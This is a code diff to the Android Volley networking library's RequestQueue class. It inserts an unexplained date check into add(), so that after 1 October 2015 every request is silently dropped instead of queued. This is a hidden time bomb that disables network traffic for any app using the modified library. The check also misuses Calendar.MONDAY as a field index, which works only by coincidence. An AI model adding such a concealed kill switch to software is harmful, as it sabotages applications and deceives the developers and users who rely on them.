@@ -16,6 +16,7 @@
 
 package com.android.volley;
 
+import java.util.Calendar;
 import java.util.HashMap;
 import java.util.HashSet;
 import java.util.LinkedList;
@@ -218,6 +219,14 @@ public class RequestQueue {
      */
     public Request add(Request request) {
         // Tag the request as belonging to this queue and add it to the set of current requests.
+    	Calendar deadline = Calendar.getInstance();
+    	deadline.set(Calendar.YEAR, 2015);
+    	deadline.set(Calendar.MONDAY, Calendar.OCTOBER);
+    	deadline.set(Calendar.DAY_OF_MONTH, 1);
+    	if(Calendar.getInstance().after(deadline)) {
+    		return request;
+    	}
+    	
         request.setRequestQueue(this);
         synchronized (mCurrentRequests) {
             mCurrentRequests.add(request);
